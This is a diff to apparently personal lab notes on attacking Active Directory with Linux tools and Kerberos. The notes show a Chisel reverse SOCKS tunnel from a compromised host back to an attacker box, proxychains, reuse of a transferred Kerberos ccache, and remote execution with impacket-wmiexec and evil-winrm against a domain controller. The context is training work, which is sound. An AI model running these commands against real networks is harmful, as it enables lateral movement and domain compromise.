@@ -93,6 +93,59 @@ id $USER@$DOMAIN
 # Using Linux Attack Tools with Kerberos
 -------------------------------
 - When using tools from a domain-joined machine, we need to ensure our KRB5CCNAME environment variable is set to the ccache file we want to use. When attacking from a machine that is not a member of domain, we need to use ![Chisel](https://github.com/jpillora/chisel) ![proxychains](https://github.com/haad/proxychains) and edit the host file.
-- 
+```shell
+cat /etc/hosts
+172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
+172.16.1.5  ms01.inlanefreight.htb  ms01
+```
+- Configure Proxychains file to use socks5 and port 1080
+```shell
+    cat /etc/proxychains.conf
+    socks5 127.0.0.1 1080
+```
+- Download Chisel to PWNBOX
+```shell
+    wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+    gzip -d chisel_1.7.7_linux_amd64.gz
+    mv chisel_* chisel && chmod +x ./chisel
+    sudo ./chisel server --reverse 
+```
+- RDP to MS01 machine
+- Execute chisel from MS01 machine
+```shell
+    chisel.exe client $PWNBOX_IP:8080 R:socks
+```
+- Transfer ccache file from LINUX-1 and create environment varialbe KRB5CCNAME with the value corresponding to the path of the ccachfile
+```shell
+    export KRB5CCNAME=/home/htb-student/$CCACHE_FILE
+```
 
+## Impacket
+- Use Impacket with proxychains and Kerberos Authentication
+```shell
+    # PWNBOX
+    proxychains impacket-wmiexec ms01 -k
+    
+    # if prompted for a password, use -no-pass option
+ ```
+ ## Evil-winrm
+ - Must install the package
+ ```shell
+    # PWNBOX
+    sudo apt-get install krb5-user -y
+ ```
+ - Configure the Keberos file for the Domain
+ ```shell
+     cat /etc/krb5.conf
+     default_realm = INLANEFREIGHT.HTB
+     
+     [realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+ ```
+ - Using Evil-WinRM with Kerberos
+ ```shell
+    proxychains evil-winrm -i dc01 -r inlanefreight.htb
+ ```
 
